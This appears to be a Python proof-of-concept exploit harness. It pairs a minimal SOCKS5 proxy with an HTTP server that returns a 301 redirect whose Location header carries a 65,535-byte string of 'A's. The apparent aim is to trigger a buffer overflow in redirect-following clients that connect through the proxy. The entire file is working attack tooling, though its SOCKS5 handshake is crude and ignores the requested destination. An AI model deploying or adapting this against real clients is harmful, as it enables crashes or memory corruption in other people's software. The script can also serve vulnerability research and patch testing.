import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

def generate_string():
    """
    Generate a payload string for HTTP redirection.
    
    Returns:
        str: The generated payload string.
    """
    print("[+] Generating payload string for HTTP redirection")
    payload = "A" * 65535
    return payload

def socks5_proxy():
    """
    SOCKS5 Proxy Server function.
    Listens on port 1080 and forwards incoming connections to the HTTP server.
    """
    def handle_client(client_socket):
        """
        Handle individual client connections for the SOCKS5 proxy.
        
        Args:
            client_socket (socket): The client socket object.
        """
        print(f"[+] Received SOCKS5 connection from {client_socket.getpeername()}")
        
        # Perform SOCKS5 handshake
        client_socket.recv(2)
        client_socket.sendall(b'\x05\x00')
        print("[+] SOCKS5 handshake complete")

        # Hardcoding target address and port for now
        target_address = '127.0.0.1'
        target_port = 8080

        # Connect to the target
        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target.connect((target_address, target_port))

        # Send the connection established message
        client_socket.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('127.0.0.1') + (8080).to_bytes(2, 'big'))
        print("[+] SOCKS5 connection established")

        # Construct GET request
        get_request = f"GET / HTTP/1.1\r\nHost: {target_address}:{target_port}\r\n\r\n"
        target.send(get_request.encode('utf-8'))
        print(f"[+] Sent GET request to target {target.getpeername()}")

        while True:
            response = target.recv(65535*2)
            print(f"[+] Received {len(response)} bytes from target {target.getpeername()}")
            client_socket.send(response)
            print(f"[+] Sent {len(response)} bytes to client {client_socket.getpeername()}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 1080))
    server.listen(5)

    print("SOCKS5 proxy running on port 1080")

    while True:
        client_sock, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_sock,))
        client_thread.start()

def http_server():
    """
    HTTP Server function.
    Listens on port 8080 and generates payload for HTTP redirection.
    """
    print("HTTP server running on port 8080")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8080))
    server_socket.listen(5)

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] HTTP server received connection from {addr}")
        
        # Read the incoming request (we're not doing anything with it in this example)
        request = client_socket.recv(1024).decode('utf-8')
        print(f"[+] HTTP request: {request}")
        
        # Generate the payload string
        payload = generate_string()
        print("[+] Payload string generated...")

        # Create the HTTP response with the long Location header
        response = f"HTTP/1.1 301 Moved\r\nContent-Length: 0\r\nConnection: Close\r\nLocation: http://localhost:8080/{payload}\r\n\r\n"

        print("[+] HTTP response generated...")

        # Send the HTTP response
        client_socket.sendall(response.encode('utf-8'))
        print(f"[+] HTTP response sent to client {addr}")
        
        # Close the connection
        client_socket.close()

if __name__ == "__main__":
    # Create threads for SOCKS5 proxy and HTTP server
    socks5_thread = threading.Thread(target=socks5_proxy, daemon=True)
    http_thread = threading.Thread(target=http_server, daemon=True)
    
    # Start the threads
    socks5_thread.start()
    http_thread.start()
    
    # Wait for both threads to complete
    socks5_thread.join()
    http_thread.join()
